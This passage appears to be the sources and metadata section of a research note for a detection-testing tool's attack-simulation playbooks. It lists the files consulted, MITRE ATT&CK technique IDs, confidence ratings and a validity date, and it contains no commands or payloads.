- Direct file read: `internal/playbooks/embedded/techniques/T1057_process_discovery.yaml` — canonical multi-variant technique pattern
- Direct file read: `internal/playbooks/embedded/techniques/T1041_exfiltration_http.yaml` — canonical C2-safe network simulation pattern
- Direct file read: `internal/playbooks/embedded/techniques/UEBA_credential_spray_chain.yaml` — canonical UEBA chain pattern
- Direct file read: `internal/playbooks/embedded/techniques/UEBA_lateral_discovery_chain.yaml` — canonical UEBA chain with behavioral description
- Direct file read: `internal/playbooks/types.go` — EventSpec struct definition (event_id, channel, description, contains)
- Direct file read: `internal/playbooks/loader.go` — auto-discovery via fs.WalkDir confirmed
- Direct file read: `.planning/phases/03-additional-techniques/03-CONTEXT.md` — locked decisions D-01 through D-08

### Secondary (MEDIUM confidence)

- `ls internal/playbooks/embedded/techniques/` — 43 existing files enumerated; tactic coverage gaps confirmed (no Collection, no C2 files)
- README.md lines 370–520 — existing technique table format confirmed (per-technique `| Eigenschaft | Wert |` property tables)
- MITRE ATT&CK technique IDs (T1005, T1560, T1071, T1095, T1119) — confirmed from training knowledge; consistent with Context.md locked decisions

### Tertiary (LOW confidence)

- Sysmon EID 11 (FileCreate) behavior for Compress-Archive — inferred from Sysmon documentation patterns; should be validated during execution

---

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH — all patterns confirmed from existing codebase files
- Architecture: HIGH — loader auto-discovery confirmed from source, no code changes needed
- Technique EventSpec choices: HIGH — event IDs confirmed from existing similar techniques (T1041 for EID 3/22, T1083 for EID 4688/4104, T1134 for EID 4672/4673)
- UEBA scenario design: HIGH — existing 3 UEBA files provide definitive templates
- C2 safe simulation: HIGH — T1041 established the `.invalid` TLD pattern, confirmed working
- Pitfalls: HIGH — based on actual Phase 1/2 decisions documented in CONTEXT.md and STATE.md

**Research date:** 2026-03-25
**Valid until:** 2026-04-24 (30 days — stable domain, no external dependencies)
